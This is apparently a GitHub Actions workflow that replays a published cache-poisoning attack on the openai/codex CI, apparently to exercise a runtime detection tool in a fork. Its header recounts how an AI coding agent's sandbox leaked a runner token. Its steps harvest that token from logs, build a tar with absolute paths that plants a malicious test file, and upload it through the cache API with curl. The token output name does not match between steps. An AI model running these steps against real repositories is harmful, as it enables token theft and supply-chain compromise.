# Garnet Depi Replay — STAGE 2
#
# Cache poisoning, the Cacheract step of the Depi openai/codex chain
# (https://depi.security/blog/20261111-backdooring-codex/).
#
# What the article's chain did here:
#   - The sandbox blocks all network access, so the attacker used the leaked
#     runtime token from OUTSIDE the victim job (their own repo) — the cache
#     service still attributes the write to the victim repo.
#   - GitHub cache entries are tar archives with absolute paths, extracted
#     without validation. A poisoned entry matching rust-ci's cache key
#     writes an attacker file anywhere in the job environment.
#   - Target key: rust-ci's `argument_comment_lint` job restores
#     `argument-comment-lint-Linux-6.1.0-6.1.0-hashFiles(...)` before running
#     `python3 -m unittest discover -s tools/argument-comment-lint`.
#   - The poisoned entry plants `test_depi.py` in that directory; unittest
#     discovery executes it inside rust-ci, which holds `Actions: write`.
#
# Replay notes:
#   - Primary token: the ACTIONS_RUNTIME_TOKEN reassembled from stage 1's
#     log slices (proves the whole exfil loop works end to end).
#     Fallback: this job's own runtime token from env (a normal step sees it;
#     only the Codex sandbox had to dig it out of Runner.Worker's memory).
#   - No >10GB cache flooding (the article's eviction trick): this fork has
#     no existing argument-comment-lint-Linux-* entry for the branch, so the
#     poisoned entry is the only match for the key.
#   - Everything stays inside this fork.

name: "Garnet Depi Replay — Stage 2: cache poisoning"

on:
  workflow_dispatch:
    inputs:
      stage1_run_id:
        description: "Stage 1 run ID to harvest the leaked runtime token from"
        required: true
        type: string
      variant:
        description: "Which scenario to run"
        required: true
        default: "malicious"
        type: choice
        options:
          - malicious
          - clean

permissions:
  contents: read
  actions: read

concurrency:
  group: garnet-depi-stage2
  cancel-in-progress: false

jobs:
  cacheract:
    name: "Cacheract replay (${{ inputs.variant }})"
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2
        with:
          persist-credentials: false

      - name: Garnet Runtime Review
        uses: garnet-org/action@673a06d87748bec49e4d8df22d371b2a3420aba4 # v2.5.2
        with:
          api_token: ${{ secrets.GARNET_API_TOKEN }}
          show_detections: "true"

      # ------------------------------------------------------------------
      # [ATTACKER] Reads the victim job's live logs (the exfil channel) and
      # reassembles the token slices. In the article the attacker watched
      # the streamed output in real time; here stage 2 pulls the in-flight
      # job log through the same API surface.
      # ------------------------------------------------------------------
      - name: "[attacker] harvest leaked runtime token from stage-1 logs"
        if: ${{ inputs.variant == 'malicious' }}
        id: harvest
        env:
          GH_TOKEN: ${{ github.token }}
          STAGE1_RUN_ID: ${{ inputs.stage1_run_id }}
        run: |
          set -euo pipefail
          python3 replay/depi/attacker/harvest_token.py > /tmp/harvest.out
          cat /tmp/harvest.out
          if grep -q '^DEPI_TOKEN=' /tmp/harvest.out; then
            { echo 'DEPI_TOKEN<<EOF'; sed -n 's/^DEPI_TOKEN=//p' /tmp/harvest.out; echo 'EOF'; } >> "$GITHUB_OUTPUT"
            echo "stolen runtime token reassembled ($(sed -n 's/^DEPI_TOKEN=//p' /tmp/harvest.out | wc -c) chars)"
          else
            echo "::warning::stage-1 harvest failed; stage 2 will fall back to its own runtime token"
          fi

      - name: "[attacker] compute rust-ci cache key + build poisoned tar"
        if: ${{ inputs.variant == 'malicious' }}
        run: |
          set -euo pipefail
          # Replicate hashFiles() for the exact key rust-ci's
          # argument_comment_lint job looks up (paths as in its `key:`).
          HASH=$(python3 replay/depi/attacker/hashfiles.py \
            tools/argument-comment-lint/Cargo.lock \
            tools/argument-comment-lint/rust-toolchain \
            .github/workflows/rust-ci.yml \
            .github/workflows/rust-ci-full.yml)
          KEY="argument-comment-lint-Linux-6.1.0-6.1.0-${HASH}"
          echo "poison key: ${KEY}"
          echo "KEY=${KEY}" >> "$GITHUB_ENV"

          # Build the tar exactly like the poisoned entry: absolute paths,
          # extracted blindly on restore. Contains the malicious test plus
          # stand-ins for the cached cargo paths so the job continues past
          # the cache-hit branch.
          STAGE=/home/runner/poison
          rm -rf "$STAGE" && mkdir -p \
            "$STAGE/home/runner/work/codex/codex/tools/argument-comment-lint" \
            "$STAGE/home/runner/.cargo/bin" \
            "$STAGE/home/runner/.cargo/registry/index" \
            "$STAGE/home/runner/.cargo/registry/cache" \
            "$STAGE/home/runner/.cargo/git/db"
          cp replay/depi/attacker/test_depi.py \
            "$STAGE/home/runner/work/codex/codex/tools/argument-comment-lint/test_depi.py"
          echo '# stand-in for cached cargo-dylint binary' > "$STAGE/home/runner/.cargo/bin/cargo-dylint"
          echo '# stand-in for cached dylint-link binary'  > "$STAGE/home/runner/.cargo/bin/dylint-link"
          tar -czf poisoned.tar -C "$STAGE" home
          echo "poisoned tar: $(wc -c < poisoned.tar) bytes"
          tar -tzf poisoned.tar

      # ------------------------------------------------------------------
      # [ATTACKER] Plant the entry through the Actions cache service with
      # the stolen token: reserve key, upload blob, commit — the same
      # three calls the runner's cache action makes, which is what
      # Cacheract automates.
      # ------------------------------------------------------------------
      - name: "[attacker] plant poisoned cache entry (stolen token)"
        if: ${{ inputs.variant == 'malicious' }}
        env:
          STOLEN_TOKEN: ${{ steps.harvest.outputs.DEPITOKEN }}
        run: |
          set -euo pipefail
          TOKEN="${STOLEN_TOKEN:-${ACTIONS_RUNTIME_TOKEN:-}}"
          CACHE_URL="${ACTIONS_CACHE_URL:-${ACTIONS_RESULTS_URL:-}}"
          if [ -z "$TOKEN" ] || [ -z "$CACHE_URL" ]; then
            echo "no stolen token or cache URL available:"
            echo "  token: ${TOKEN:+present}${TOKEN:-MISSING}  cache url: ${CACHE_URL:-MISSING}"
            exit 1
          fi
          echo "cache service: $CACHE_URL"
          SIZE=$(stat -c%s poisoned.tar)

          echo "=== reserve key $KEY ==="
          RES=$(curl -sf -X POST "$CACHE_URL/_apis/artifactcache/cache/$KEY" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"size\": $SIZE}")
          echo "$RES"
          CACHE_ID=$(echo "$RES" | jq -r .cacheId)
          if [ -z "$CACHE_ID" ] || [ "$CACHE_ID" = "null" ]; then
            echo "::error::cache reserve failed"
            exit 1
          fi

          echo "=== upload blob (cacheId $CACHE_ID) ==="
          curl -sf -X PATCH "$CACHE_URL/_apis/artifactcache/blob/$CACHE_ID" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/octet-stream" \
            --data-binary @poisoned.tar

          echo "=== commit ==="
          curl -sf -X POST "$CACHE_URL/_apis/artifactcache/cache/$CACHE_ID" \
            -H "Authorization: Bearer $TOKEN" \
            -H "Content-Type: application/json" \
            -d "{\"size\": $SIZE}"
          echo "poisoned entry planted"

      - name: "[clean] normal cache save (no poison)"
        if: ${{ inputs.variant == 'clean' }}
        uses: actions/cache@668228422ae6a00e4ad889ee87cd7109ec5666a7 # v5.0.4
        with:
          path: replay/depi
          key: garnet-depi-clean-${{ github.run_id }}
